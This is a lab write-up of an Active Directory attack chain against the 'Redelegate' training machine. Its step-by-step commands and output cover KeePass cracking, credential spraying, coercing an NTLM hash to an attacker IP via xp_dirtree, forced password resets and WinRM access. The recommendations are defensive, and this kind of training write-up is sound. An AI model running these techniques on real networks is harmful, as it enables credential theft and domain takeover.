+++
title = "Redelegate-CPTS-Prep-Box-Writeup.md"
date = 2026-02-20T00:00:00Z
draft = false
description = "Redelegate is a hard-difficulty Windows machine featuring anonymous FTP access, KeePass database cracking, MSSQL enumeration, NTLM hash capture, ACL abuse with User-Force-Change-Password, SeEnableDelegationPrivilege exploitation, and Constrained Delegation attack for full domain compromise"
tags = ["CPTS", "HTB", "Redelegate", "CPTS Prep", "Active Directory", "KeePass", "MSSQL", "ACL Abuse", "Constrained Delegation", "SeEnableDelegationPrivilege"]
+++

## Executive Summary

During November 2025, a simulated penetration test was conducted against the Windows domain "redelegate.vl" (`10.129.234.50`). The objective was to evaluate the security posture of the target and identify potential escalation paths to full domain compromise.

The assessment successfully demonstrated a complete attack chain, moving from anonymous access to domain administrator privileges. The following key findings were identified:

- **Anonymous FTP Access:** The FTP server allowed anonymous login, exposing sensitive files including a KeePass database (`Shared.kdbx`) and audit documents.

- **KeePass Password Cracking:** The KeePass database was protected with a weak password based on a seasonal pattern. A custom wordlist was created and successfully cracked the database password.

- **Credential Spraying:** The KeePass database contained multiple credentials. Spraying these against MSSQL revealed valid credentials for the `SQLGuest` account.

- **NTLM Hash Capture:** Using `xp_dirtree` in MSSQL, the `sql_svc` account was coerced into authenticating to an attacker-controlled SMB server, capturing its NTLMv2 hash.

- **Password Reuse Discovery:** The cracked KeePass password `Fall2024!` was successfully reused by multiple users. Spraying revealed that `Marie.Curie` used this password for MSSQL authentication.

- **ACL Abuse - Force Password Change:** BloodHound analysis revealed that `Marie.Curie` had `User-Force-Change-Password` privileges over `Helen.Frost`. This was abused to reset Helen's password.

- **SeEnableDelegationPrivilege:** The `Helen.Frost` account had the `SeEnableDelegationPrivilege` and `GenericAll` permissions over the `FS01$` computer account.

- **Constrained Delegation Attack:** Using these privileges, the `FS01$` machine account was configured for constrained delegation to the domain controller. Its password was reset, and a delegation ticket was requested to impersonate the `DC$` account.

- **Domain Compromise:** The delegation ticket was used with secretsdump to extract all domain hashes, including the `Administrator` account, achieving full domain compromise.

**Impact:**  
This chain of exploits resulted in complete compromise of the Active Directory domain. An attacker with anonymous FTP access was able to escalate to domain administrator by chaining together weak password practices, credential reuse, ACL misconfigurations, and delegation abuse.

**Recommendations:**

- **Secure FTP Access:** Disable anonymous FTP access and implement proper authentication for file shares.
- **Strong Password Policies:** Enforce complex password requirements and avoid seasonal password patterns.
- **Credential Reuse Prevention:** Implement multi-factor authentication and educate users about the risks of password reuse.
- **Review ACLs:** Regularly audit Active Directory ACLs and remove unnecessary privileges like `User-Force-Change-Password`.
- **Restrict Delegation Privileges:** Limit the assignment of `SeEnableDelegationPrivilege` and monitor for abuse of delegation configurations.
- **Secure MSSQL:** Disable `xp_dirtree` or restrict its usage to prevent NTLM hash capture attacks.

## About

Redelegate is a hard-difficultly Windows machine that starts with Anonymous FTP access, which allows the attacker to download sensitive Keepass Database files. The attacker then discovers that the credentials in the database are valid for MSSQL local login, which leads to enumerate SIDs and performs a password spray attack. Being a member of the `HelpDesk` group, the newly compromised user account `Marie.Curie` has a `User-Force-Change-Password` Access Control setup over the `Helen.Frost` user account; that user account has privileges to get a PS remoting session onto the Domain Controller. The `Helen.Frost` user account also has the `SeEnableDelegationPrivilege` assigned and has full control over the `FS01$` machine account, essentially allowing the attacker account to modify the `msDS-AllowedToDelegateTo` LDAP attribute and change the password of a computer object and perform a Constrained Delegation attack.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. Network Scanning**  
The assessment began with a comprehensive port scan of the target to identify all accessible services.

```bash
nmap -p- -vvv --min-rate 10000 10.129.234.50
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-12 17:37 UTC
Initiating Ping Scan at 17:37
...[snip]...
Completed SYN Stealth Scan at 17:37, 8.42s elapsed (65535 total ports)
Nmap scan report for 10.129.234.50
Host is up, received reset ttl 127 (0.093s latency).
Scanned at 2025-07-12 17:37:02 UTC for 9s
Not shown: 65503 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5357/tcp  open  wsdapi           syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49932/tcp open  unknown          syn-ack ttl 127
54861/tcp open  unknown          syn-ack ttl 127
59350/tcp open  unknown          syn-ack ttl 127
59351/tcp open  unknown          syn-ack ttl 127
59357/tcp open  unknown          syn-ack ttl 127
59361/tcp open  unknown          syn-ack ttl 127
59376/tcp open  unknown          syn-ack ttl 127
59379/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds
           Raw packets sent: 82423 (3.627MB) | Rcvd: 65536 (2.622MB)
nmap -p 21,53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5357,5985,9389,47001 -sCV 10.129.234.50
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-12 17:38 UTC
Nmap scan report for 10.129.234.50
Host is up (0.093s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-12 17:54:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-07-12T12:26:36
|_Not valid after:  2055-07-12T12:26:36
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-07-12T17:55:00+00:00; +15m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-07-12T17:54:50+00:00
|_ssl-date: 2025-07-12T17:55:00+00:00; +15m59s from scanner time.
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2025-04-09T10:21:45
|_Not valid after:  2025-10-09T10:21:45
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-07-12T17:54:51
|_  start_date: N/A
|_clock-skew: mean: 15m58s, deviation: 0s, median: 15m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.29 seconds
```
Findings: The scan revealed a Windows Domain Controller with standard AD ports, plus additional services including FTP (21/tcp), MSSQL (1433/tcp), and WinRM (5985/tcp). Anonymous FTP login was allowed.

**2. DNS and Kerberos Configuration**  
Host and Kerberos configuration files were generated for proper domain resolution.

```bash
❯ nxc smb 10.129.234.50 -u '' -p ''
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\:


❯ nxc smb 10.129.234.50 -u '' -p '' --generate-hosts-file redelegate.hosts
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\:


❯ cat redelegate.hosts| tee -a /etc/hosts
10.129.234.50     DC.redelegate.vl redelegate.vl DC


❯ nxc smb 10.129.234.50 -u '' -p '' --generate-krb5-file redelegate.krb5
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [+] krb5 conf saved to: redelegate.krb5
SMB         10.129.234.50   445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=redelegate.krb5
SMB         10.129.234.50   445    DC               [+] redelegate.vl\:
❯ cat redelegate.krb5| tee /etc/krb5.conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = REDELEGATE.VL

[realms]
    REDELEGATE.VL = {
        kdc = dc.redelegate.vl
        admin_server = dc.redelegate.vl
        default_domain = redelegate.vl
    }

[domain_realm]
    .redelegate.vl = REDELEGATE.VL
    redelegate.vl = REDELEGATE.VL#

```

### Phase 2: Anonymous FTP Enumeration

**3. FTP Access**  
Anonymous FTP access was used to enumerate and download available files.

```bash
❯ nxc smb 10.129.234.50 -u '' -p '' --shares
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\:
SMB         10.129.234.50   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED


❯ nxc smb 10.129.234.50 -u guest -p '' --shares
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [-] redelegate.vl\guest: STATUS_ACCOUNT_DISABLED


❯ nxc smb 10.129.234.50 -u guest -p 'a' --shares
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [-] redelegate.vl\guest:a STATUS_LOGON_FAILURE



❯ nxc ftp 10.129.234.50 -u anonymous -p anonymous --ls
FTP         10.129.234.50   21     10.129.234.50    [+] anonymous:anonymous - Anonymous Login!
FTP         10.129.234.50   21     10.129.234.50    [*] Directory Listing
FTP         10.129.234.50   21     10.129.234.50    10-20-24  12:11AM                  434 CyberAudit.txt
FTP         10.129.234.50   21     10.129.234.50    10-20-24  04:14AM                 2622 Shared.kdbx
FTP         10.129.234.50   21     10.129.234.50    10-20-24  12:26AM                  580 TrainingAgenda.txt


❯ nxc ftp 10.129.234.50 -u anonymous -p anonymous --get CyberAudit.txt
FTP         10.129.234.50   21     10.129.234.50    [+] anonymous:anonymous - Anonymous Login!
FTP         10.129.234.50   21     10.129.234.50    [+] Downloaded: CyberAudit.txt


❯ nxc ftp 10.129.234.50 -u anonymous -p anonymous --get Shared.kdbx
FTP         10.129.234.50   21     10.129.234.50    [+] anonymous:anonymous - Anonymous Login!
FTP         10.129.234.50   21     10.129.234.50    [+] Downloaded: Shared.kdbx


❯ nxc ftp 10.129.234.50 -u anonymous -p anonymous --get TrainingAgenda.txt

FTP         10.129.234.50   21     10.129.234.50    [+] anonymous:anonymous - Anonymous Login!
FTP         10.129.234.50   21     10.129.234.50    [+] Downloaded: TrainingAgenda.txt

```

**Findings:** Three files were downloaded:

- `CyberAudit.txt` - Security audit findings mentioning weak passwords and excessive privileges
    
- `Shared.kdbx` - KeePass password database
    
- `TrainingAgenda.txt` - Employee training schedule mentioning "Weak Passwords" and the pattern "SeasonYear!"

### Phase 3: KeePass Database Cracking

**4. Password Pattern Analysis**  
The training agenda suggested users might be using seasonal passwords with the current year.

**5. Custom Wordlist Creation**  
A custom wordlist was created based on seasonal patterns.

```bash
❯ ls
CyberAudit.txt              Phase-2-Internal-Foothold.md     Phase-4-Lateral-Movement.md   redelegate.hosts  Shared.kdbx
Phase-1-External-Access.md  Phase-3-Privilege-Escalation.md  Phase-5-Domain-Compromise.md  redelegate.krb5   TrainingAgenda.txt

❯ cat CyberAudit.txt
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
   
❯ cat TrainingAgenda.txt
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them#
--------------------------------------------
❯ vim season_year_list.txt
# Contents:
# Winter2024!
# Spring2024!
# Summer2024!
# Fall2024!
# Autumn2024!
------------------------------------
❯ ls
CyberAudit.txt  Phase-1-External-Access.md    Phase-3-Privilege-Escalation.md  Phase-5-Domain-Compromise.md  redelegate.krb5  TrainingAgenda.txt
passwords.txt   Phase-2-Internal-Foothold.md  Phase-4-Lateral-Movement.md      redelegate.hosts              Shared.kdbx
------------------------------------------
❯ file Shared.kdbx
Shared.kdbx: Keepass password database 2.x KDBX
-----------------------------------------------
```

**6. KeePass Hash Extraction**  
The KeePass database hash was extracted using keepass2john.

```bash
❯ keepass2john Shared.kdbx > keepass2john_hash.txt
❯ cat keepass2john_hash.txt
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca
-----------------------------------------------------
```

**7. Password Cracking**  
The hash was cracked using john with the custom wordlist.

```bash
❯ john keepass2john_hash.txt --wordlist=season_year_list.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 6 candidates left, minimum 16 needed for performance.
<REDACTED>!        (Shared)
1g 0:00:00:00 DONE (2025-11-27 15:07) 7.692g/s 46.15p/s 46.15c/s 46.15C/s Winter2024!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```
**Findings:** The password was successfully cracked: `<REDACTED>`.

**8. KeePass Database Contents**  
The KeePass database contained multiple entries with usernames and passwords:

|Entry Name|Password|
|---|---|
|Timesheet|`<REDACTED>`|
|Payroll|`<REDACTED>`|
|FTPUser|`<REDACTED>`|
|Administrator|`<REDACTED>`|
|Wordpress Panel|`<REDACTED>`|
|SQLGuest|`<REDACTED>`|

### Phase 4: MSSQL Enumeration

**9. Credential Spraying Against MSSQL**  
The extracted credentials were sprayed against the MSSQL service.


```bash 
❯ nxc mssql 10.129.234.50 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success --local-auth
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [-] DC\keepass:<REDACTED>! (Login failed for user 'keepass'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\anonymous:<REDACTED> (Login failed for user 'anonymous'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Timesheet:<REDACTED> (Login failed for user 'Timesheet'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Payroll:22331144 (Login failed for user 'Payroll'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\FTPUser:<REDACTED> (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Administrator:<REDACTED> (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Wordpress Panel:<REDACTED> (Login failed for user 'Wordpress Panel'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:<REDACTED>

 ~honeypoop/HTB/C/R/03-Attack-Chains      
```
**Findings:** The credentials for `SQLGuest` with password `<REDACTED>` were valid.

**10. MSSQL Shell Access**  
An interactive MSSQL shell was obtained using the valid credentials.

```bash 
❯ mssqlclient.py  redelegate.vl/SQLGuest:<REDACTED>@DC.redelegate.vl
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)>

```

### Phase 5: NTLM Hash Capture

**11. UNC Path Injection**  
The `xp_dirtree` stored procedure was used to force authentication to an attacker-controlled SMB server.
```bash 
SQL (SQLGuest  guest@master)> exec master.dbo.xp_dirtree '\\10.10.16.25\any\thing'
subdirectory   depth
------------   -----
SQL (SQLGuest  guest@master)>
```

**12. Responder Capture**  
Responder was started to capture incoming NTLM authentication attempts.

```bash
❯ responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [OFF]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.25]
    Responder IPv6             [dead:beef:4::1017]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-XZH3A5C2ZJ9]
    Responder Domain Name      [QAO7.LOCAL]
    Responder DCE-RPC Port     [46380]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.234.50
[SMB] NTLMv2-SSP Username : REDELEGATE\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::REDELEGATE:52c7b60e6caf4cc0:C6F1387CA0E516CD886D2A29898CF713:0101000000000000808A9655945FDC0113E8583D94ED5DC00000000002000800510041004F00370001 <REDACTED> 00000000000000

```
**Findings:** The NTLMv2 hash for the `sql_svc` account was captured: `<REDACTED_HASH>`.

### Phase 6: Password Spraying with Domain Users

**13. User Enumeration**  
Domain users were enumerated through RID brute forcing or LDAP queries.

**14. Password Spraying**  
The cracked KeePass password `Fall2024!` was sprayed against domain users.
```bash 
❯ nxc mssql 10.129.234.50 -u mssql_users_rid_brute.txt -p 'Fall2024!' --continue-on-success
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\Administrator:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\Christine.Flanders:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [+] redelegate.vl\Marie.Curie:Fall2024!
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\Helen.Frost:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\Michael.Pontiac:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\Mallory.Roberts:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\James.Dinkleberg:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\Helpdesk:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\IT:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\Finance:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\Ryan.Cooper:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\sql_svc:Fall2024! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
❯ nxc mssql 10.129.234.50 -u Marie.Curie -p 'Fall2024!' --continue-on-success
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [+] redelegate.vl\Marie.Curie:Fall2024!

 /home/h/HTB/C/R/
```

**Findings:** The user `Marie.Curie` with password `Fall2024!` was valid for MSSQL authentication.

### Phase 7: ACL Analysis

**15. BloodHound Enumeration**  
BloodHound was used to map Active Directory relationships for `Marie.Curie`.
```bash
rusthound-ce --domain redelegate.vl -u marie.curie -p 'Fall2024!' --zip
```


**Findings:** BloodHound revealed:

- `Marie.Curie` had `User-Force-Change-Password` privileges over `Helen.Frost`
    
- `Helen.Frost` had `GenericAll` permissions over the `FS01$` computer account
    
- `Helen.Frost` also had `SeEnableDelegationPrivilege`
    

### Phase 8: Password Reset Chain

**16. Force Password Change for Helen.Frost**  
Using `Marie.Curie`'s privileges, the password for `Helen.Frost` was reset.

```bash 
❯ uv run ./nxc/netexec.py smb dc.redelegate.vl -u Marie.Curie -p 'Fall2024!'  -M change-password -o USER=helen.frost NEWPASS=Password123

      Built netexec @ file:///opt/NetExec
Uninstalled 1 package in 0.65ms
Installed 1 package in 0.99ms
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024!
CHANGE-P... 10.129.234.50   445    DC               [+] Successfully changed password for helen.frost

 /opt/NetExec  main !1 ?1        
```

**17. Credential Validation for Helen.Frost**  
The new password was validated against the domain.


```bash 
❯ uv run ./nxc/netexec.py smb dc.redelegate.vl -u Helen.Frost -p 'Password123'
      Built netexec @ file:///opt/NetExec
Uninstalled 1 package in 1ms
Installed 1 package in 1ms
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Helen.Frost:Password123

❯ uv run ./nxc/netexec.py winrm dc.redelegate.vl -u Helen.Frost -p 'Password123'
      Built netexec @ file:///opt/NetExec
Uninstalled 1 package in 0.50ms
Installed 1 package in 1ms
WINRM       10.129.234.50   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
WINRM       10.129.234.50   5985   DC               [+] redelegate.vl\Helen.Frost:Password123 (Pwn3d!)

 /opt/NetExec  main !1 ?1       
```
**Findings:** The credentials were valid and provided WinRM access (Pwn3d!).

**18. WinRM Session as Helen.Frost**  
A WinRM session was established as `Helen.Frost`.
```bash 
❯ evil-winrm-py -i dc.redelegate.vl -u helen.frost -p Password123
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc.redelegate.vl:5985' as 'helen.frost'
evil-winrm-py PS C:\Users\Helen.Frost\Documents> cd ../
ls
evil-winrm-py PS C:\Users\Helen.Frost> ls


    Directory: C:\Users\Helen.Frost


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        10/30/2024   9:05 AM                Desktop
d-r---        10/20/2024   6:41 AM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos


evil-winrm-py PS C:\Users\Helen.Frost> cd Desktop
evil-winrm-py PS C:\Users\Helen.Frost\Desktop> ls


    Directory: C:\Users\Helen.Frost\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/26/2025   7:41 PM             34 user.txt


evil-winrm-py PS C:\Users\Helen.Frost\Desktop> cat user.txt
<REDACTED> 
evil-winrm-py PS C:\Users\Helen.Frost\Desktop>

```

**19. User Flag Retrieval**  
The user flag was retrieved from the desktop.

**20. Privilege Enumeration**  
The user's privileges were examined.

```bash

❯ evil-winrm-py -i dc.redelegate.vl -u helen.frost -p Password123
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc.redelegate.vl:5985' as 'helen.frost'

evil-winrm-py PS C:\Users\Helen.Frost\Desktop> whoami
redelegate\helen.frost
